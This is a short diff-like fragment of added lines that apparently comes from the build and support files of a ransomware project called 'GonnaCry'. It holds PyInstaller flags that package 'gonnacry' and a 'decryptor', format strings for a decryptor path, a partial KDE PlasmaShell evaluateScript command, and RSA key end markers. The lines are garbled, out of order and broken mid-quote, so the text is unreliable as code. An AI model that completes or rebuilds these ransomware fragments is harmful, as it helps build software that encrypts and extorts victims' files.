@@ -1,0 +1,13 @@
+ ------------- |:-------------:|
+ --clean decryptor.py -n decryptor
+ --clean main.py -n gonnacry
+ --command .{}'.format(variables.decryptor_path))
+ --command=.{}'.format(variables.decryptor_path))
+ --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
+"
+" --clean GonnaCry/{}.py -n {}'.format(program, program)"
+-------------"
+-----END PUBLIC KEY-----"
+-----END PUBLIC KEY-----"""""""
+-----END RSA PRIVATE KEY-----"
+-----END RSA PRIVATE KEY-----"""""""
